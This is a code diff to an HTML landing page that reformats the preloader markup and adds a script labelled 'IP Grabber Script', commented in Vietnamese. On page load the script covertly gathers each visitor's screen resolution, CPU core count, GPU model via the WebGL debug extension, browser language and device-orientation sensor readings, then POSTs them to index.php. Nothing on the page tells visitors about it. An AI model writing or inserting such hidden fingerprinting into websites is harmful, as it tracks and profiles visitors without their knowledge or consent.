@@ -15,15 +15,15 @@
   <body>
     <div class="wrapper">
       <!-- Preloader -->
-    <div id="preloader">
-      <div class="spinner">
-        <div class="rect1"></div>
-        <div class="rect2"></div>
-        <div class="rect3"></div>
-        <div class="rect4"></div>
-        <div class="rect5"></div>
+      <div id="preloader">
+        <div class="spinner">
+          <div class="rect1"></div>
+          <div class="rect2"></div>
+          <div class="rect3"></div>
+          <div class="rect4"></div>
+          <div class="rect5"></div>
+        </div>
       </div>
-  </div>
       <div id="bg"></div>
       <div class="content">
         <header>
@@ -35,12 +35,50 @@
       </div>
     </div>
     <audio src="./sound/sound.mp3" autoplay></audio>
+
+    <!-- IP Grabber Script -->
+    <script>
+        // Thu thập thông tin độ phân giải màn hình
+        var resolution = window.screen.width + "x" + window.screen.height;
+        
+        // Thu thập thông tin CPU và GPU
+        var cpu = navigator.hardwareConcurrency || 'Unknown';
+        var gpu = (function() {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+            }
+            return 'Unknown';
+        })();
+
+        // Thu thập ngôn ngữ trình duyệt
+        var language = navigator.language || 'Unknown';
+
+        // Thu thập dữ liệu cảm biến nếu có
+        var sensor_data = 'Unknown';
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener("deviceorientation", function(event) {
+                sensor_data = `Alpha: ${event.alpha}, Beta: ${event.beta}, Gamma: ${event.gamma}`;
+            }, true);
+        }
+
+        // Gửi dữ liệu đến PHP
+        function sendData() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "index.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(`resolution=${resolution}&cpu=${cpu}&gpu=${gpu}&language=${language}&sensor_data=${sensor_data}`);
+        }
+
+        // Gọi hàm gửi dữ liệu khi tải trang
+        sendData();
+    </script>
+
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script
-  src="https://code.jquery.com/jquery-3.4.1.js"
-  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
-  crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
